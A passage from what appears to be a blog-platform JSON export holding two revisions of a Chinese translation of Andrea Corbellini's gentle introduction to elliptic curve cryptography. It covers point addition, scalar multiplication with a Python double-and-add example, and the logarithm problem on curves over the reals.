x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"scalar-multiplication\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p>\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 下周见\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[10,31],[10,32],[10,33],[10,34],[10,35],[10,36],[10,37],[10,38],[10,39],[10,40],[10,41],[10,42],[10,43],[10,44],[10,45],[10,46],[10,47],[10,48],[10,49],[1,\"p\",[]]]}","created_at_ts":1577086647479,"created_at":"2019-12-23 07:37:27"},{"id":"5e006f7c2ee0ee0001819903","post_id":"5dfc7ca42ee0ee000181900e","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 **ECC**, **ECD**或者**ECDSA**. ECC是椭圆曲线密码学(`Elliptic Curve Cryptography`)的首字母缩写, 而另外两个都是基于ECC实现的算法.\"}],[\"markdown\",{\"markdown\":\"如今, 我们在 [TLS](https://tools.ietf.org/html/rfc4492), [PGP](https://tools.ietf.org/html/rfc6637) 和 [SSH](https://tools.ietf.org/html/rfc5656) 里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础, 更别提ECC在[比特币](https://en.bitcoin.it/wiki/Secp256k1)和其他各种加密货币中发挥的巨大作用了.\"}],[\"markdown\",{\"markdown\":\"在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用. RSA等算法由于其相对容易解释的原理和[可以轻松实现的简化模型](http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/), 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\"}],[\"markdown\",{\"markdown\":\"希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的**目标**并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到), 而是通过尽量简单的方式说明 **什么是ECC以及它为什么是安全的**, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外, 我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\"}],[\"markdown\",{\"markdown\":\"具体来说, 本系列文章将涉及以下内容: \\n\\n1. [实数域上的椭圆曲线和群论](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/) (本篇文章将会讨论)\\n2. [有限域上的椭圆曲线和离散对数难题](http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh)\\n3. [秘钥对的生成及两种ECC算法: ECDH和ECDSA](http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh)\\n4. [ECC破解算法和与RSA的对比](http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh)\"}],[\"markdown\",{\"markdown\":\"为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后, 你需要对什么是\\\"简单\\\"问题, 什么是\\\"复杂\\\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线 \\n\\n首先, 什么是椭圆曲线? [Wolfram MathWorld](http://mathworld.wolfram.com/) 给出了一个超赞且完善的[定义](http://mathworld.wolfram.com/EllipticCurve.html). 但是考虑到本文目标,  可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合: \"}],[\"html\",{\"html\":\"$$y^2 = x^3 + ax + b$$\"}],[\"html\",{\"html\":\"且满足 $4a^3 + 27b^2 \\\\ne 0$ (以便排除<a href=\\\"https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)\\\">奇点</a>). 上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\"}],[\"image\",{\"src\":\"/content/images/2019/12/curves.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\\n</pre>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singularities.png\"}],[\"html\",{\"html\":\"奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$), 它们都不是有效的椭圆曲线.\"}],[\"markdown\",{\"markdown\":\"根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的. 我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点, 可以通过下面的方程来完善我们的定义:\"}],[\"html\",{\"html\":\"$$\\\\left\\\\{ (x, y) \\\\in \\\\mathbb{R}^2\\\\ |\\\\ y^2 = x^3 + ax + b,\\\\ 4 a^3 + 27 b^2 \\\\ne 0 \\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{ 0 \\\\right\\\\}$$\"}],[\"markdown\",{\"markdown\":\"# 群\\n\\n\"}],[\"html\",{\"html\":\"<p>\\n数学上的群是指定义了一个用\\\"+\\\"表示的二元运算\\\"加法\\\"的集合. 为了让集合 $\\\\mathbb{G}$ 成为一个群, 就必须先定义一个加法运算并且这个集合应该遵循以下四条特征: \\n</p>\\n\\n<ol>\\n  <li> <strong>封闭性:</strong> 如果a和b都是 $\\\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\\\mathbb{G}$ 中的元素 </li>\\n  <li> <strong>结合律:</strong> $(a + b) + c = a + (b + c)$</li>\\n  <li> 存在<strong>单位元</strong> 0 满足 $a + 0 = 0 + a = a$ </li>\\n  <li> 任何元素都有一个与之相对应的<strong>逆元</strong>, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$</li>\\n</ol>\\n\\n如果我们再加上第五个条件: \\n<br>\\n<strong>交换律:</strong> $a + b = b + a$\\n<br>\\n那么这个群就可以被称作<strong>阿贝尔群</strong>\\n\\n<p>\\n    根据加法的一般概念, 整数集合 $\\\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\\n</p>\\n\\n<p>\\n    群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: <strong>单位元是唯一的</strong>; <strong>逆元也是唯一的</strong>, 意思是: 对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"group-law\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线上的群律\"}],[\"html\",{\"html\":\"<p>\\n    我们可以在椭圆曲线上定义一个群, 具体来说:\\n</p>\\n\\n<ul>\\n  <li>\\n    群里的元素是椭圆曲线上的点\\n  </li>\\n  <li>\\n    <strong>单位元</strong>是指在无穷远处的点 0\\n  </li>\\n  <li>\\n    点P的<strong>逆元</strong>是指其关于x轴对称的点\\n  </li>\\n  <li>\\n    <strong>加法</strong>可以根据以下规则定义: <strong>找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$</strong>\\n  </li>\\n</ul>\"}],[\"image\",{\"src\":\"/content/images/2019/12/three-aligned-points.png\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n在一条直线上的三点之和为0\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n    注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q + (P + R) = R + (P + Q) = \\\\cdots = 0$. 这样, 我们有了一个直观的证明, <strong>我们定义的加法运算也满足结合律和交换律, 这是一个阿贝尔群.</strong>\\n</p>\\n\\n<p>\\n    到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"geometric-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 几何意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n    还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程, 我们可以推导出一种计算P和Q之和的几何方法: <strong>过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是 $P + Q$ 的结果</strong>.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \\n    \\n  <ul>\\n    <li> <strong>当 P = 0 且 Q = 0 时会怎么样?</strong> 显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P + 0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立</li>\\n    <li> <strong>当 P = -Q 时会怎么样?</strong> 在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有 $P + Q = P + (-P) = 0$ </li>\\n    <li> <strong>当 P = Q 时会怎么样?</strong> 在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\\\ne P$, 而让 Q' 逐渐接近 P 时会发生什么? </li>\\n  </ul>\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-point-doubling.gif\",\"caption\":\"\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\\n</pre>\"}],[\"html\",{\"html\":\"当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P 点在曲线上的切线与曲线的交点.\"}],[\"html\",{\"html\":\"<p>\\n  <ul>\\n    <li> <strong> 如果 $P \\\\ne Q$, 而又不存在第三个点 R 呢?</strong> 这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 </li>\\n  </ul>\\n<p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/animation-tangent-line.gif\"}],[\"html\",{\"html\":\"<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \\n很容易就能看出两点之和为切点关于x轴的对称点.\\n</pre>\"}],[\"html\",{\"html\":\"<p>\\n  假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q 是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\\n</p>\\n\\n<p>\\n  现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, <strong>也可以看看我做的这个计算椭圆曲线加法的 <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">HTML5/JavaScript版可视化工具</a> !</strong>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"algebraic-addition\\\"></a>\"}],[\"markdown\",{\"markdown\":\"# 代数意义上的加法运算\"}],[\"html\",{\"html\":\"<p>\\n  如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易, 但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n椭圆曲线加法方程的代数方法推导在 <strong> <a href=\\\"https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition\\\"> Promgramming BitCoin 的第二章 </a> </strong> \\n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \\n</pre>\\n\\n<p>\\n    首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$, 所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 <strong> 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. </strong>\\n</p>\\n\\n<p>\\n    如果 P 和 Q 不相等 ($x_P \\\\ne x_Q$), 则过两点的直线的斜率为:\\n    $$ m = \\\\frac{y_P - y_Q}{x_P - x_Q} $$ \\n    这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\\n    $$ \\n    \\\\begin{array}{rcl}\\n    x_R & = & m^2 - x_P - x_Q \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P)\\n\\t\\\\end{array} \\n    $$\\n    或者写成: \\n    $$ y_R = y_Q + m(x_R - x_Q) $$\\n    则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\\n</p>\\n\\n<p>\\n    如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易, 但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\\n</p>\\n\\n<p>\\n    作为替代方案, 我们可以用一个<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html\\\">可视化工具</a>通过一个例子来说明. 现在有 $P = (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3, 2)$. 我们来看看带入方程是否成立: \\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{2 - 4}{1 - 3} = 1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + 1 \\\\cdot (-3 - 1) = -2 \\\\\\\\\\n    & = & y_Q + m(x_R - x_Q) = 4 + 1 \\\\cdot (-3 - 3) = -2\\n\\\\end{array}\\n    $$\\n    很好, 结果是正确的!\\n</p>\\n\\n<p>\\n  注意, 上面的方程在 <strong>P 或者 Q 是曲线上的切点<strong>时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{y_P - y_Q}{x_P - x_Q} = \\\\frac{4 - 2}{-1 - 1} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 4 + -1 \\\\cdot (1 - (-1)) = 2\\n\\\\end{array}\\n    $$\\n  我们得出 $P + Q = (1, -2)$, 这个结果和用<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2\\\">可视化工具</a>算出的结果是一样的\\n</p>\\n    \\n<p>\\n    当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算<strong>斜率</strong>:\\n    $$ m = \\\\frac{3 x_P^2 + a}{2 y_P} $$\\n    正如我们所料, m 的表达式是如下方程的一阶导数: \\n    $$ y_P = \\\\pm \\\\sqrt{x_P^3 + ax_P + b} $$\\n    检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q = (1, 2) 时\\n    $$\\n    \\\\begin{array}{rcl}\\n    m & = & \\\\frac{3x_P^2 + a}{2 y_P} = \\\\frac{3 \\\\cdot 1^2 - 7}{2 \\\\cdot 2} = -1 \\\\\\\\\\n    x_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\\\\\\n    y_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\\\cdot (-1 - 1) = 4\\n\\\\end{array}\\n    $$\\n    可以得出 $P + P = -R = (-1, -4)$, <a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2\\\">结果是正确的!</a>\\n</p>\"}],[\"html\",{\"html\":\"<a id=\\\"scalar-multiplication\\\"> </a>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法\"}],[\"html\",{\"html\":\"<p>\\n\\t除加法外, 我们还可以定义另一种运算: <strong>标量乘法</strong>, 如下: \\n    $$ \\n    nP = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n  \\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html\\\">可视化工具</a>, 有兴趣的话可以看看.\\n</p>\\n\\n<p>\\n  写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了. 但实际上我们可以有更快的算法.\\n</p>\\n\\n<p id=\\\"double-and-add\\\">\\n  其中一种叫做<strong>倍加法</strong>(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制 $10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\\n    $$\\n    \\\\begin{array}{rcl}\\n    151 & = & 1 \\\\cdot 2^7 + 0 \\\\cdot 2^6 + 0 \\\\cdot 2^5 + 1 \\\\cdot 2^4 + 0 \\\\cdot 2^3 + 1 \\\\cdot 2^2 + 1 \\\\cdot 2^1 + 1 \\\\cdot 2^0 \\\\\\\\\\n    & = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\\n\\\\end{array}\\n    $$\\n    (将n转换成二进制并表示为多个2的指数次之和)\\n    通过上面的表达式, 我们可以写出: \\n    $$\\n    151 \\\\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\\n    $$\\n    倍加法的具体实现步骤如下:\\n    <ul>\\n        <li> 找到点 P </li>\\n        <li> 翻倍, 得到 2P </li>\\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\\n        <li> 2P 翻倍, 得到 2^2P </li>\\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\\n        <li> 别加$2^3P$ </li>\\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\\n        <li> ... </li>\\n    </ul>\\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\\\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\\n</p>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef bits(n):\\n    \\\"\\\"\\\"\\n    Generates the binary digits of n, starting\\n    from the least significant bit.\\n\\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\\n    \\\"\\\"\\\"\\n    while n:\\n        yield n & 1\\n        n >>= 1\\n\\ndef double_and_add(n, x):\\n    \\\"\\\"\\\"\\n    Returns the result of n * x, computed using\\n    the double and add algorithm.\\n    \\\"\\\"\\\"\\n    result = 0\\n    addend = x\\n\\n    for bit in bits(n):\\n        if bit == 1:\\n            result += addend\\n        addend *= 2\\n\\n    return result\\n```\"}],[\"html\",{\"html\":\"<p>\\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 对数\"}],[\"html\",{\"html\":\"<p>\\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\\\"对数\\\"而不是\\\"除法\\\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\\n</p>\\n\\n<p>\\n    我没听说过任何\\\"简单\\\"的算法可以用于解决对数难题, 不过通过<a href=\\\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\\\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\\n</p>\\n\\n<p>\\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\\\"容易的\\\", 不过求解离散对数将会成为一个\\\"十分困难\\\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 下周见\"}],[\"html\",{\"html\":\"<p>\\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 